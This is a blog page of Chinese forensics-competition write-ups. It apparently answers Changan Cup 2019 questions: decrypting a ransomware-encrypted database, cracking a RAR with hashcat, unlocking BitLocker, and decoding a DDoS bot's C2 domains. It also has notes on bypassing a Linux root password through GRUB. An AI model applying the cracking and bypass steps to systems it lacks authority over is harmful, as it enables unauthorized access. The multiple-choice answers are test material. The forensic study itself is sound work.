<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201107154615513.png" alt="image-20201107154615513"></p>
<blockquote>
<ol start="84">
<li><p>请综合分析，嫌疑人入侵服务所使用的登陆方式为：（<strong>B</strong>）</p>
<p> A. SSH 密码登陆     B. SSH 密钥登陆     C. 连接后门程序     D.FTP 登陆</p>
</li>
</ol>
</blockquote>
<p>我们之前在检材四中的xshell数据文件中见到了密钥文件：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201107155204586.png" alt="image-20201107155204586"></p>
<blockquote>
<ol start="85">
<li><p>可知嫌疑人应对外发送过邮件，请分析并找到发出的邮件，可知邮件的发送时间为：（<strong>B</strong>）</p>
<p><code> A. 2019-07-13 17:55       B. 2019-07-14 17:56       C. 2019-07-14 17:57        D. 2019-07-14 17:58</code></p>
</li>
<li><p>可知嫌疑人应对外发送过邮件，请分析并找到发出的邮件，可知邮件收件人为：（<strong>B</strong>）</p>
<p><code> A. 1649841939@qq.com    B. 1649840939@qq.com    C. 1649845939@qq.com    D. 1649848939@qq.com</code></p>
</li>
</ol>
</blockquote>
<p>这个题目是真的骚，我们在前面有发现，他下载过<code>Foxmail</code>，于是我们查看<code>Foxmail</code>使用痕迹，然后把时间定位到<code>2019-07-13 17:52:20</code>，所以一般就选择A，但是是错的……因为他不一定用<code>Foxmail</code>发文件。所以我们换一个思路，在检材三中（嫌疑人使用的VPN服务器）有数据包，既然他发邮件，那么一定走了代理，所以我们再研究研究那个检材3的那两个数据包。这里有一个姿势点：</p>
<blockquote>
<p><strong>常用的电子邮件协议有<code>SMTP、POP3、IMAP4</code>它们都隶属于<code>TCP/IP</code>协议簇.</strong></p>
</blockquote>
<p>所以我们数据包里面直接找这几个协议：<img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201108094246421.png" alt="image-20201108094246421"></p>
<blockquote>
<ol start="87">
<li><p>请重构被入侵的网站，可知该网站后台管理界面的登陆用户名为：（<strong>C</strong>）</p>
<p><code> A. root       B Administered       C. admin        D. user</code></p>
</li>
</ol>
</blockquote>
<p>重构网站需要先恢复数据库，我们再检材2中有加密程序，有加密过的数据库。所以我们开始老本行！逆！</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201108111125565.png" alt="image-20201108111125565"></p>
<p>思路很简单，上<code>exp</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;db.encrypt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s=f.read()</span><br><span class="line"></span><br><span class="line">r=<span class="built_in">bytes</span>([((x^<span class="number">0xaa</span>)+<span class="number">256</span>-<span class="number">66</span>)%<span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> inp:</span><br><span class="line">    inp.write(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后计算<code>SHA256</code>：<img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201108112522288.png" alt="image-20201108112522288"></p>
<p>我们在检材4的<code>C</code>盘中看到了一个待挂载的硬盘：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201108154253039.png" alt="image-20201108154253039"></p>
<p>然后双击，显示<code>Bitlocker</code>：<img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201108154511990.png" alt="image-20201108154511990"></p>
<p>我们打开<code>Bitlocker</code>：<img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201108154544420.png" alt="image-20201108154544420"></p>
<p>现在我们缺少密码……还记得前面在翻<code>QQ</code>的时候看到的那个消息嘛，提示一下：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201108154812496.png" alt="image-20201108154812496"></p>
<p>我们再根据他的<code>QQ</code>号和上面这个内容，可以猜到，在前面我们分析的邮件正是他用来备份密码的右键，我们复原一下邮件：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201108162121999.png" alt="image-20201108162121999"></p>
<p>发现4个<code>EML</code>文件，导出以后，直接下载<img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201108162907437.png" alt="image-20201108162907437"></p>
<p>但是有密码！！！我们联想检材4桌面上的字典和<code>niuroumian6</code>，我们尝试用这个字典来爆破压缩包。这里爆破用的工具是开膛手<code>john</code>和<code>hashcat</code>：</p>
<blockquote>
<p><code>$ rar2john.exe BitLocker.rar </code>BitLocker.rar:$rar5$16$0c231f49ba3ded4bc944dee58f2be760$15$2a5c3ec4a5380b7a9d5517cc8ba386b6$8$07400e39e08a2e03`</p>
<p><code>$ hashcat.exe -m 13000 -a 0 $rar5$16$0c231f49ba3ded4bc944dee58f2be760$15$2a5c3ec4a5380b7a9d5517cc8ba386b6$8$07400e39e08a2e03 新建文本文档.txt</code></p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201110210507588.png" alt="image-20201110210507588"></p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201110210522337.png" alt="image-20201110210522337"></p>
<p>215643485745446664666432494f413536343335363a223a22</p>
<p>!VCHWEDfdfd2IOA564356:”:”</p>
<p>打开密钥备份文件，用恢复密钥成功解锁硬盘：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201110210731636.png" alt="image-20201110210731636"></p>
<p>查看<code>db</code>文件，和我们前面逆向加密程序恢复的<code>db</code>一样。</p>
<p>里面还有那个网站的……所有东西，那我们把这个<code>dump</code>出来，：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111111604097.png" alt="image-20201111111604097"></p>
<blockquote>
<ol start="88">
<li><p>请重构被入侵的网站，并登陆网站后台管理界面，对该网站进行证据固定，可知该网站首页左侧导航栏，不包含下列那个内容：（<strong>D</strong>）</p>
<p> A. 信息列表       B. 资金管理       C. 资金数据       D. 会员信息</p>
</li>
<li><p>通过分析知，嫌疑人对目标服务器植入了勒索程序，请解密检材 2 中的被加密数据库，</p>
<p> 其<code>sha256</code>值为：（<strong>A</strong>）</p>
<p><code> A. 8dcf2f71482bb492b546eec746c714be9324ea254778bf5cbb9e5115b30c77a2</code></p>
<p><code> B. 8dcf2f71482bb492b546eec746c714be9324ea254778bf5cbb9e5115b30c77a3</code></p>
<p> <code>C. 8dcf2f71482bb492b546eec746c714be9324ea254778bf5cbb9e5115b30c77a4</code></p>
<p> <code>D.8dcf2f71482bb492b546eec746c714be9324ea254778bf5cbb9e5115b30c77a5</code></p>
</li>
</ol>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111125021116.png" alt="image-20201111125021116"></p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111112517872.png" alt="image-20201111112517872"></p>
<blockquote>
<ol start="90">
<li><p>通过分析知，嫌疑人有对目标服务器植入 <code>ddos </code>程序，对该程序进行功能性分析，可知该程序会将自身复制到目标机器的什么目录下：（<strong>B</strong>）</p>
<p><code> A. /etc       B. /lib       C. /root       D. /tmp</code></p>
</li>
<li><p>通过分析知，嫌疑人有对目标服务器植入 ddos 程序，对该程序进行功能性分析，可知该程序主控地址为（多选）：（<strong>AD</strong>）</p>
<p><code>A. shaoqian.f3322.net     B. shaoqian.f3344.net     C. gh.dsaj3a2.org     D. gh.dsaj2a1.org</code></p>
</li>
</ol>
</blockquote>
<p>根据聊天记录易知，该<code>ddos</code>程序是<code>runit</code>，我们在检材四里面找到该文件，然后逆向分析……</p>
<p>我们在main函数里面看见有一些乱码，然后前面跟了解密函数。我们跟进然后机密看看：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201112131329103.png" alt="image-20201112131329103"></p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201112131341467.png" alt="image-20201112131341467"></p>
<p>然后我们再找找程序里面还有那些加密数据，然后写个脚本解一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="string">&quot;m7A4nQ_/nA&quot;</span>,<span class="string">&quot;m [(n3&quot;</span>,<span class="string">&quot;m6_6n3&quot;</span>,<span class="string">&quot;m4S4nAC/n&amp;ZV&quot;</span>,<span class="string">&quot;m.[$n__#4%\\C&quot;</span>,<span class="string">&quot;m.[$n3&quot;</span>,<span class="string">&quot;m4S4nAC/nA&quot;</span>,<span class="string">&quot;m4S4nAC/n&amp;ZV&quot;</span>,<span class="string">&quot;m.[$n__#4%\\C&quot;</span>,<span class="string">&quot;m.[$n3&quot;</span>]</span><br><span class="line">a=[<span class="number">0x36</span>,<span class="number">0x46</span>,<span class="number">0x36</span>,<span class="number">0x7B</span>,<span class="number">0x1C</span>,<span class="number">0x19</span>,<span class="number">0x27</span>,<span class="number">0x34</span>,<span class="number">0x2D</span>,<span class="number">0x55</span>,<span class="number">0x1B</span>,<span class="number">0x50</span>,<span class="number">0x42</span>,<span class="number">0x27</span>,<span class="number">0x5A</span>,<span class="number">0x70</span>,<span class="number">0x23</span>,<span class="number">0x1C</span>,<span class="number">0x29</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x19</span>,<span class="number">0x23</span>,<span class="number">0x6E</span>,<span class="number">0x34</span>,<span class="number">0x17</span>,<span class="number">0x45</span>,<span class="number">0x5C</span>,<span class="number">0x41</span>,<span class="number">0x79</span>,<span class="number">0x59</span>,<span class="number">0x26</span>,<span class="number">0x7F</span>,<span class="number">0x46</span>,<span class="number">0x23</span>,<span class="number">0x32</span>,<span class="number">0x47</span>]</span><br><span class="line">b=[<span class="number">0x25</span>,<span class="number">0x2A</span>,<span class="number">0x1C</span>,<span class="number">0x22</span>,<span class="number">0x32</span>,<span class="number">0x52</span>,<span class="number">0x5C</span>,<span class="number">0x73</span>,<span class="number">0x20</span>,<span class="number">0x70</span>,<span class="number">0x17</span>,<span class="number">0x5A</span>,<span class="number">0x46</span>,<span class="number">0x56</span>,<span class="number">0x7C</span>,<span class="number">0x2</span>,<span class="number">0x76</span>,<span class="number">0x76</span>,<span class="number">0x6</span>,<span class="number">0x3A</span>,<span class="number">0x32</span>,<span class="number">0x5B</span>,<span class="number">0x57</span>,<span class="number">0x2E</span>,<span class="number">0x30</span>,<span class="number">0x28</span>,<span class="number">0x58</span>,<span class="number">0x5B</span>,<span class="number">0x1A</span>,<span class="number">0x57</span>,<span class="number">0x75</span>,<span class="number">0x3</span>,<span class="number">0x70</span>,<span class="number">0x70</span>,<span class="number">0x1C</span>,<span class="number">0x29</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0C</span>,<span class="number">0x73</span>,<span class="number">0x75</span>,<span class="number">0x75</span>,<span class="number">0x0D</span>,<span class="number">0x49</span>,<span class="number">0x5</span>,<span class="number">0x9</span>,<span class="number">0x75</span>,<span class="number">0x1E</span>,<span class="number">0x74</span>,<span class="number">0x72</span>,<span class="number">0x1C</span>,<span class="number">0x74</span>,<span class="number">0x71</span>,<span class="number">0x1</span>,<span class="number">0x18</span>,<span class="number">0x73</span>,<span class="number">0x7B</span>,<span class="number">0x73</span>,<span class="number">0x0D</span>]</span><br><span class="line">key = [<span class="number">0x42</span>,<span class="number">0x42</span>,<span class="number">0x32</span>,<span class="number">0x46</span>,<span class="number">0x41</span>,<span class="number">0x33</span>,<span class="number">0x36</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x31</span>,<span class="number">0x46</span>,<span class="number">0x30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(i)):</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i[j])^key[j%<span class="number">16</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]^key[i%<span class="number">16</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">chr</span>(b[i]^key[i%<span class="number">16</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201112150926723.png" alt="image-20201112150926723"></p>
<p>然后，，，然后我就不会了……至于复制到哪里，我是拿着答案去找的。main函数调用了一个daemon_process:</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201112152112264.png" alt="image-20201112152112264"></p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201112152342036.png" alt="image-20201112152342036"></p>
<p>应该就是这样吧……</p>
<blockquote>
<p>Frank会长说：“一直纠结一个题就没意思了！”</p>
</blockquote>
<p>那就，，，放过吧~</p>
<blockquote>
<ol start="92">
<li><p>压缩包 <code>test2-master.zip</code> 中的文件是什么？（<strong>C</strong>）</p>
<p> A.恶意软件       B.加密程序       C.密钥文件       D.下载软件</p>
</li>
</ol>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111212304607.png" alt="image-20201111212304607"></p>
<blockquote>
<ol start="93">
<li><p>应用程序 <code>TrueCrypt-7.2.exe </code>是在什么时间下载到本机的？（<strong>C</strong>）</p>
<p><code> A. 2019-07-06 00:04:38     B. 2019-07-06 00:06:38     C. 2019-07-06 00:08:38     D. 2019-07-06 00:10:38</code></p>
</li>
</ol>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111212528321.png" alt="image-20201111212528321"></p>
<blockquote>
<ol start="94">
<li><p>文件 runit.txt 从哪个域名下载的？（<strong>D</strong>） </p>
<p> <code>A.https://pan.forensix.cn/lib/367d7f96-299f-4029-91a8-a31594b736cf/runit</code></p>
<p><code> B. https://pan.baidu.com/s/19uDE7H2RtEf7LLBgs5sDmg?errno=0&amp;errmsg=AuthLoginSucess&amp;&amp;bduss=&amp;ssnerror=0&amp;traceid=</code></p>
<p> <code>C.https://pan.forensix.cn/seafhttp/files/dec88b97-b2bc-414f-93a3-dcbbc15d615/runit</code></p>
<p><code> D.https://pan.forensix.cn/seafhttp/files/8fdf1982-e323-4efe-ae28-2bba21b5162c/runit</code></p>
</li>
</ol>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111212723050.png" alt="image-20201111212723050"></p>
<blockquote>
<ol start="95">
<li><p><code>BitLocker </code>密钥在什么位置？（<strong>B</strong>）</p>
<p><code>A. D:/DOWNLOAD       B. C:/USER       C. C:/       D. D:/</code></p>
</li>
<li><p><code>BitLocker.rar </code>生成的时间是？（<strong>B</strong>）</p>
<p> <code>A. 2019-07-13 17:51:47     B. 2019-07-13 17:52:19     C. 2019-07-13 17:53:24     D. 2019-07-13 16:31:06</code></p>
</li>
</ol>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111212942950.png" alt="image-20201111212942950"></p>
<blockquote>
<ol start="97">
<li><p>文件 <code>we.tar.gz</code> 传输完成的时间是？（<strong>C</strong>）</p>
<p><code> A. 2019-07-13 16:31:06     B. 2019-07-13 16;33:00     C. 2019-07-13 16:33:15     D. 2019-07-13 16:33:30</code></p>
</li>
</ol>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111213246657.png" alt="image-20201111213246657"></p>
<blockquote>
<ol start="98">
<li><p>嫌疑人在什么时间登陆网页微信？（<strong>A</strong>）</p>
<p> <code>A. 2019-07-13 16:34:55     B. 2019-07-13 16:40:13     C. 2019-07-13 16:45:45     D.2019-07-13 16:53:45</code></p>
</li>
</ol>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111213636179.png" alt="image-20201111213636179"></p>
<blockquote>
<ol start="99">
<li><p>嫌疑人于 <code>2019-07-13 17:22:23 </code>下载了什么文件？（<strong>B</strong>）</p>
<p> A.网站目录压缩文件     B.数据库备份文件     C.网站日志文件     D.数据库日志文件</p>
</li>
</ol>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201111215055052.png" alt="image-20201111215055052"></p>
<blockquote>
<ol start="100">
<li><p>硬盘 C 盘根目录中，文件<code>pagefile.sys.vhd</code>的作用是什么？（<strong>D</strong>）</p>
<p> A.<code> pagefile</code> 页面交换文件     B. 虚拟机启动文件     C. 系统配置文件     D. 虚拟磁盘</p>
</li>
</ol>
</blockquote>
<p>……在前面我们双击这个，然后解开<code>Bitlocker</code>，就挂载上了<code>D</code>    盘，所以应该是虚拟磁盘。</p>
<h1 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h1><p>8、请找出该服务器的网站访问端口是什么？（ ）</p>
<p>25、当我们想将网站重构好时，访问网站时，web 应用在其中承担什么样的工作？（ 需取证大师）</p>
<p>69、嫌疑人成功连接至 192.168.184.128 服务器的时间为：（ ）</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/" rel="tag">电子数据取证</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-RAID重组" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/13/RAID%E9%87%8D%E7%BB%84/" class="article-date">
      <time datetime="2021-10-12T16:21:20.000Z" itemprop="datePublished">2021-10-13</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/13/RAID%E9%87%8D%E7%BB%84/">RAID重组</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="修改root密码"><a href="#修改root密码" class="headerlink" title="修改root密码"></a>修改root密码</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h4><p>添加grub启动参数 rw init=/bin/sh 或者 sysroot/bin/sh</p>
<p>chroot &amp; passwd</p>
<h5 id="虚拟机方面"><a href="#虚拟机方面" class="headerlink" title="虚拟机方面"></a>虚拟机方面</h5><p>使用取证大师挂载到本地，然后在添加设备中添加RAID硬盘组本地磁盘进行重组</p>
<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013002605156.png" alt="image-20211013002605156"></p>
<p>导入虚拟机时注意使用转化好的虚拟磁盘（需要全部导入，并且一般选取其中最大的可能包含操作系统的放在首位导入）</p>
<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013002917659.png" alt="image-20211013002917659"></p>
<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013003021252.png" alt="image-20211013003021252"></p>
<p>对其中 ro进行改写为 rw init=sysroot\bin\sh, 即可绕过密码进入系统</p>
<p>后输入chroot sysroot/ 更换根目录</p>
<p>之后就可以用passwd来设置新密码</p>
<p>输入exit后reboot来重启</p>
<h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h4><p>挂在可启动的系统上</p>
<p>Chroot &amp; passwd</p>
<p><img src="/2021/10/13/RAID%E9%87%8D%E7%BB%84/image-20211013004758124.png" alt="image-20211013004758124"></p>
<h3 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h3><p>ls -lh</p>
<p>cat ect/hostname</p>
<p>fdisk -l 可以查看挂载那些硬盘</p>
<p>fdisk -l 1 less 可以查看有哪些设备</p>
<p>mdadm –help 获取帮助</p>
<p>mdadm –detail /dev/md5</p>
<p>lvm 下 lvdisplay</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/" rel="tag">电子数据取证</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-数字取证" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/12/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/" class="article-date">
      <time datetime="2021-10-12T15:42:13.000Z" itemprop="datePublished">2021-10-12</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/12/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/">数字取证</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h1><h2 id="电子数据取证"><a href="#电子数据取证" class="headerlink" title="电子数据取证"></a>电子数据取证</h2><h3 id="活取证："><a href="#活取证：" class="headerlink" title="活取证："></a>活取证：</h3><h4 id="抓取文件metadata-访问记录-、创建时间线、命令历史、日志文件、哈希摘要、内存等等"><a href="#抓取文件metadata-访问记录-、创建时间线、命令历史、日志文件、哈希摘要、内存等等" class="headerlink" title="抓取文件metadata(访问记录)、创建时间线、命令历史、日志文件、哈希摘要、内存等等"></a>抓取文件metadata(访问记录)、创建时间线、命令历史、日志文件、哈希摘要、内存等等</h4><h4 id="采用未受感染的程序进行取证"><a href="#采用未受感染的程序进行取证" class="headerlink" title="采用未受感染的程序进行取证"></a>采用未受感染的程序进行取证</h4><h4 id="U盘、网络-收集证据"><a href="#U盘、网络-收集证据" class="headerlink" title="U盘、网络 收集证据"></a>U盘、网络 收集证据</h4><h3 id="死取证："><a href="#死取证：" class="headerlink" title="死取证："></a>死取证：</h3><h4 id="关机后对硬盘进行镜像操作"><a href="#关机后对硬盘进行镜像操作" class="headerlink" title="关机后对硬盘进行镜像操作"></a>关机后对硬盘进行镜像操作</h4><h2 id="电子取证比赛考察范围"><a href="#电子取证比赛考察范围" class="headerlink" title="电子取证比赛考察范围"></a>电子取证比赛考察范围</h2><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><h4 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h4><h4 id="UNIX-Linux"><a href="#UNIX-Linux" class="headerlink" title="UNIX/Linux"></a>UNIX/Linux</h4><h4 id="移动终端"><a href="#移动终端" class="headerlink" title="移动终端"></a>移动终端</h4><h4 id="网络数据取证-等等"><a href="#网络数据取证-等等" class="headerlink" title="网络数据取证 等等"></a>网络数据取证 等等</h4>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/" rel="tag">电子数据取证</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-easyRSA" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/04/easyRSA/" class="article-date">
      <time datetime="2021-10-04T03:03:26.000Z" itemprop="datePublished">2021-10-04</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/04/easyRSA/">easyRSA</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="信息加密与验证"><a href="#信息加密与验证" class="headerlink" title="信息加密与验证"></a>信息加密与验证</h2><p>How can you ensure that the person receiving your message knows that you wrote it?</p>
<p>You’ve been asked out on a date, and you want to send a message telling them that you’d love to go, however a jealous lover isn’t so happy about this.</p>
<p>When you send your message saying yes, your jealous lover intercepts the message and corrupts it so it now says no!</p>
<p>We can protect against these attacks by signing the message.</p>
<p>Imagine you write a message <code>M</code>. You encrypt this message with your <strong>friend’s public key</strong>: <code>C = Me0 mod N0</code>.</p>
<p>To sign this message, you calculate the hash of the message: <code>H(M)</code> and “encrypt” this with <strong>your private key</strong>: <code>S = H(M)d1 mod N1</code>.</p>
<p>Your friend can decrypt the message using <strong>their private key</strong>: <code>m = Cd0 mod N0</code>. Using your public key they calculate <code>s = Se1 mod N1</code>.</p>
<p>Now by computing <code>H(m)</code> and comparing it to <code>s</code>: <code>assert H(m) == s</code>, they can ensure that the message you sent them, is the message that they received!</p>
<blockquote>
<p>In real cryptosystems, it’s <a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/a/12138">best practice to use separate keys</a> for encrypting and signing messages.</p>
</blockquote>
<p>大意就是给了一个消息，对其用朋友的公钥加密，让朋友用朋友的私钥解密获得原消息</p>
<p>同时，对消息的HASH值用自己的私钥加密，让朋友用自己的公钥解密，并与获得的消息的HASH值比对</p>
<p>如果HASH值相同，那就说明消息并没有被篡改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ooo = bytes_to_long(hashlib.sha256(flag).digest())</span><br><span class="line">answer = long_to_bytes(pow(ooo, d, N)).hex()</span><br></pre></td></tr></table></figure>

<p>由于HASH加密后的值无法进行计算，所以我们需要先用.digest()将其转换成bytes形式，再将bytes转化成可以计算的Long整型值。</p>
